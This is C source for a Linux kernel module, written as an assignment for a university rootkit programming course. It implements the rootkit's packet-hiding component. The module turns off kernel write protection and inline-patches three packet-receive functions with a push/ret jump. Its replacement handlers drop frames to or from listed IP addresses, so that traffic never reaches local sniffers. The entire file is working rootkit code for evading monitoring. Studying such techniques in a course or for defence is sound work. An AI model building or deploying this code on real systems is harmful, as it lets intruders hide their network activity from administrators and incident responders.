
/*******************************************************************************/
/*                                                                             */
/*   Course: Rootkit Programming                                               */
/*   Semester: WS 2015/16                                                      */
/*   Team: 105                                                                 */
/*   Assignment: 10                                                            */
/*                                                                             */
/*   Filename: packet_masking.c                                                */
/*                                                                             */
/*   Authors:                                                                  */
/*       Name: Matei Pavaluca                                                  */
/*       Email: mateipavaluca@yahoo.com                                        */
/*                                                                             */
/*       Name: Nedko Stefanov Nedkov                                           */
/*       Email: nedko.stefanov.nedkov@gmail.com                                */
/*                                                                             */
/*   Date: January 2016                                                        */
/*                                                                             */
/*   Usage: ...                                                                */
/*                                                                             */
/*******************************************************************************/

#include <linux/module.h>		/* Needed by all kernel modules */
#include <linux/inet.h>
#include <net/ip.h>

#include "sysmap.h"				/* Needed for ... */
#include "core.h"				/* Needed for ... */


/*******************************************************************************/
/*                                                                             */
/*                       DEFINITIONS - DECLARATIONS                            */
/*                                                                             */
/*******************************************************************************/


/* Definition of macros */
#define PRINT(str) printk(KERN_INFO "rootkit packet_masking: %s\n", (str))
#define DEBUG_PRINT(str) if (show_debug_messages) PRINT(str)
#define JUMP_CODE_SIZE 6
#define JUMP_CODE_ADDRESS_OFFSET 1


/* Definition of data structs */
struct masked_ip {   /* List to keep hidden ips */
	struct list_head list;
	unsigned int ip;   /* The binary representation of the IPv4 address */
};


/* Definition of global variables */
static int show_debug_messages;
static struct list_head masked_ips;

static int (*original_packet_rcv)(struct sk_buff *, struct net_device *, struct packet_type *, struct net_device *);
static int (*original_tpacket_rcv)(struct sk_buff *, struct net_device *, struct packet_type *, struct net_device *);
static int (*original_packet_rcv_spkt)(struct sk_buff *, struct net_device *, struct packet_type *, struct net_device *);

/* Locks to avoid interfering of hooking and restoring */
static spinlock_t packet_rcv_lock;
static unsigned long packet_rcv_flags;
static spinlock_t tpacket_rcv_lock;
static unsigned long tpacket_rcv_flags;
static spinlock_t packet_rcv_spkt_lock;
static unsigned long packet_rcv_spkt_flags;

/* x86 assembly code for:

   push $0x00000000   # address to be adjusted
   ret

   The above instructions result in a jump to the absolute address
   without destroying any register values */
static char jump_code[JUMP_CODE_SIZE] = {0x68, 0x00, 0x00, 0x00, 0x00, 0xc3};
static unsigned int *target = (unsigned int *) (jump_code + JUMP_CODE_ADDRESS_OFFSET);

static char original_packet_rcv_code[JUMP_CODE_SIZE];
static char original_tpacket_rcv_code[JUMP_CODE_SIZE];
static char original_packet_rcv_spkt_code[JUMP_CODE_SIZE];


/* Declaration of functions */
int packet_masking_init(int);
int packet_masking_exit(void);

static void hook_packet_rcv(void);
static void unhook_packet_rcv(void);
static void hook_tpacket_rcv(void);
static void unhook_tpacket_rcv(void);
static void hook_packet_rcv_spkt(void);
static void unhook_packet_rcv_spkt(void);

static int my_packet_rcv(struct sk_buff *, struct net_device *, struct packet_type *, struct net_device *);
static int my_tpacket_rcv(struct sk_buff *, struct net_device *, struct packet_type *, struct net_device *);
static int my_packet_rcv_spkt(struct sk_buff *, struct net_device *, struct packet_type *, struct net_device *);

static int packet_should_be_masked(struct sk_buff *);
static int ip_is_masked(unsigned int);

int mask_packets(char *);
int unmask_packets(char *);

static void delete_masked_ips(void);


/*******************************************************************************/
/*                                                                             */
/*                                  CODE                                       */
/*                                                                             */
/*******************************************************************************/


/* Initialization function which is called when the module is
   insmoded into the kernel. It replaces ... */
int packet_masking_init(int debug_mode_on)
{
	show_debug_messages = debug_mode_on;

	INIT_LIST_HEAD(&masked_ips);

	original_packet_rcv = (void *) ROOTKIT_PACKET_RCV;
	original_packet_rcv_spkt = (void *) ROOTKIT_PACKET_RCV_SPKT;
	original_tpacket_rcv = (void *) ROOTKIT_TPACKET_RCV;

	/* Maintain a backup of the original JUMP_CODE_SIZE bytes of the code */
	memcpy(original_packet_rcv_code, original_packet_rcv, JUMP_CODE_SIZE);
	memcpy(original_tpacket_rcv_code, original_tpacket_rcv, JUMP_CODE_SIZE);
	memcpy(original_packet_rcv_spkt_code, original_packet_rcv_spkt, JUMP_CODE_SIZE);

	spin_lock_irqsave(&packet_rcv_lock, packet_rcv_flags);
	hook_packet_rcv();
	spin_unlock_irqrestore(&packet_rcv_lock, packet_rcv_flags);

	spin_lock_irqsave(&tpacket_rcv_lock, tpacket_rcv_flags);
	hook_tpacket_rcv();
	spin_unlock_irqrestore(&tpacket_rcv_lock, tpacket_rcv_flags);

	spin_lock_irqsave(&packet_rcv_spkt_lock, packet_rcv_spkt_flags);
	hook_packet_rcv_spkt();
	spin_unlock_irqrestore(&packet_rcv_spkt_lock, packet_rcv_spkt_flags);

	DEBUG_PRINT("initialized");

	return 0;
}


int packet_masking_exit(void)
{
	spin_lock_irqsave(&packet_rcv_lock, packet_rcv_flags);
	unhook_packet_rcv();
	spin_unlock_irqrestore(&packet_rcv_lock, packet_rcv_flags);

	spin_lock_irqsave(&tpacket_rcv_lock, tpacket_rcv_flags);
	unhook_tpacket_rcv();
	spin_unlock_irqrestore(&tpacket_rcv_lock, tpacket_rcv_flags);

	spin_lock_irqsave(&packet_rcv_spkt_lock, packet_rcv_spkt_flags);
	unhook_packet_rcv_spkt();
	spin_unlock_irqrestore(&packet_rcv_spkt_lock, packet_rcv_spkt_flags);

	delete_masked_ips();

	DEBUG_PRINT("exited");

	return 0;
}


static void hook_packet_rcv(void)
{
	disable_write_protect_mode();

	/* Set the correct jump target */
	*target = (unsigned int *) my_packet_rcv;

	/* Insert the jump code at the beginning of the function */
	memcpy(original_packet_rcv, jump_code, JUMP_CODE_SIZE);

	enable_write_protect_mode();
}


static void unhook_packet_rcv(void)
{
	disable_write_protect_mode();

	/* Restore the first JUMP_CODE_SIZE code bytes we changed */
	memcpy(original_packet_rcv, original_packet_rcv_code, JUMP_CODE_SIZE);

	enable_write_protect_mode();
}


static void hook_tpacket_rcv(void)
{
	disable_write_protect_mode();

	/* Set the correct jump target */
	*target = (unsigned int *) my_tpacket_rcv;

	/* Insert the jump code at the beginning of the function */
	memcpy(original_tpacket_rcv, jump_code, JUMP_CODE_SIZE);

	enable_write_protect_mode();
}


static void unhook_tpacket_rcv(void)
{
	disable_write_protect_mode();

	/* Restore the first JUMP_CODE_SIZE code bytes we changed */
	memcpy(original_tpacket_rcv, original_tpacket_rcv_code, JUMP_CODE_SIZE);

	enable_write_protect_mode();
}


static void hook_packet_rcv_spkt(void)
{
	disable_write_protect_mode();

	/* Set the correct jump target */
	*target = (unsigned int *) my_packet_rcv_spkt;

	/* Insert the jump code at the beginning of the function */
	memcpy(original_packet_rcv_spkt, jump_code, JUMP_CODE_SIZE);

	enable_write_protect_mode();
}


static void unhook_packet_rcv_spkt(void)
{
	disable_write_protect_mode();

	/* Restore the first JUMP_CODE_SIZE code bytes we changed */
	memcpy(original_packet_rcv_spkt, original_packet_rcv_spkt_code, JUMP_CODE_SIZE);

	enable_write_protect_mode();
}


static int my_packet_rcv(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt, struct net_device *orig_dev)
{
	int ret;

	spin_lock_irqsave(&packet_rcv_lock, packet_rcv_flags);

	/* Check if we need to hide packet */
	if (packet_should_be_masked(skb)) {
		DEBUG_PRINT("packet is being dropped (my_packet_rcv)");
		spin_unlock_irqrestore(&packet_rcv_lock, packet_rcv_flags);

		return 0;
	}

	/* Otherwise restore original function, call it and hook it again */
	unhook_packet_rcv();
	ret = original_packet_rcv(skb, dev, pt, orig_dev);
	hook_packet_rcv();

	spin_unlock_irqrestore(&packet_rcv_lock, packet_rcv_flags);

	/* Return the correct value of the original function */
	return ret;
}


static int my_tpacket_rcv(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt, struct net_device *orig_dev)
{
	int ret;

	spin_lock_irqsave(&tpacket_rcv_lock, tpacket_rcv_flags);

	if (packet_should_be_masked(skb)) {
		DEBUG_PRINT("packet is being dropped (my_tpacket_rcv)");
		spin_unlock_irqrestore(&tpacket_rcv_lock, tpacket_rcv_flags);

		return 0;
	}

	/* Otherwise restore original function, call it and hook it again */
	unhook_tpacket_rcv();
	ret = original_tpacket_rcv(skb, dev, pt, orig_dev);
	hook_tpacket_rcv();

	spin_unlock_irqrestore(&tpacket_rcv_lock, tpacket_rcv_flags);

	/* Return the correct value of the original function */
	return ret;
}


static int my_packet_rcv_spkt(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt, struct net_device *orig_dev)
{
	int ret;

	spin_lock_irqsave(&packet_rcv_spkt_lock, packet_rcv_spkt_flags);

	if (packet_should_be_masked(skb)) {
		spin_unlock_irqrestore(&packet_rcv_spkt_lock, packet_rcv_spkt_flags);
		DEBUG_PRINT("packet is being dropped (my_packet_rcv_spkt)");

		return 0;
	}

	/* Otherwise restore original function, call it and hook it again */
	unhook_packet_rcv_spkt();
	ret = original_packet_rcv_spkt(skb, dev, pt, orig_dev);
	hook_packet_rcv_spkt();

	spin_unlock_irqrestore(&packet_rcv_spkt_lock, packet_rcv_spkt_flags);

	/* Return the correct value of the original function */
	return ret;
}


static int packet_should_be_masked(struct sk_buff *skb)
{
	struct iphdr *ip_header;

	/* Check if this frame contains an IPv4 packet */
	if (skb->protocol == htons(ETH_P_IP)) {
		/* Extract the IP header */
		ip_header = (struct iphdr *) skb_network_header(skb);

		/* Check if the masked IPv4 address is in the sender or the receiver field */
		if (ip_is_masked(ip_header->saddr) || ip_is_masked(ip_header->daddr)) {
			DEBUG_PRINT("packet with masked IP address detected");

			return 1;
		}
	}

	return 0;
}


/* Function that checks whether we need to mask the specified ip */
static int ip_is_masked(unsigned int ip)
{
	struct masked_ip *cur;
	struct list_head *cursor;

	list_for_each(cursor, &masked_ips) {
		cur = list_entry(cursor, struct masked_ip, list);
		if (cur->ip == ip)
			return 1;
	}

	return 0;
}


int mask_packets(char *ip)
{
	u8 ipv4_bin_repr[4];
	unsigned int target_ip;
	struct masked_ip *new;

	/* Convert the IPv4 address from literal to binary representation */
	if (!in4_pton(ip, -1, ipv4_bin_repr, -1, NULL))
		return -1;

	target_ip = *(unsigned int *) ipv4_bin_repr;
	if (ip_is_masked(target_ip))
		return -1;

	if ((new = kmalloc(sizeof(struct masked_ip), GFP_KERNEL)) == NULL)
		return -ENOMEM;

	new->ip = target_ip;

	list_add(&new->list, &masked_ips);

	//printk(KERN_INFO "rootkit packet_masking: masking packets from/to IP %s\n", ip);

	return 0;
}


int unmask_packets(char *ip)
{
	u8 ipv4_bin_repr[4];
	unsigned int target_ip;
	struct masked_ip *cur;
	struct list_head *cursor, *next;

	/* Convert the IPv4 address from literal to binary representation */
	if (!in4_pton(ip, -1, ipv4_bin_repr, -1, NULL))
		return -1;

	target_ip = *(unsigned int *) ipv4_bin_repr;

	list_for_each_safe(cursor, next, &masked_ips) {
		cur = list_entry(cursor, struct masked_ip, list);
		if (cur->ip == target_ip) {
			list_del(cursor);
			kfree(cur);

			return 0;
		}
	}

	return -EINVAL;
}


static void delete_masked_ips(void)
{
	struct list_head *cursor, *next;
	struct masked_ip *masked_ip_ptr;

	cursor = next = NULL;
	list_for_each_safe(cursor, next, &masked_ips) {
		masked_ip_ptr = list_entry(cursor, struct masked_ip, list);
		list_del(cursor);
		kfree(masked_ip_ptr);
	}
}
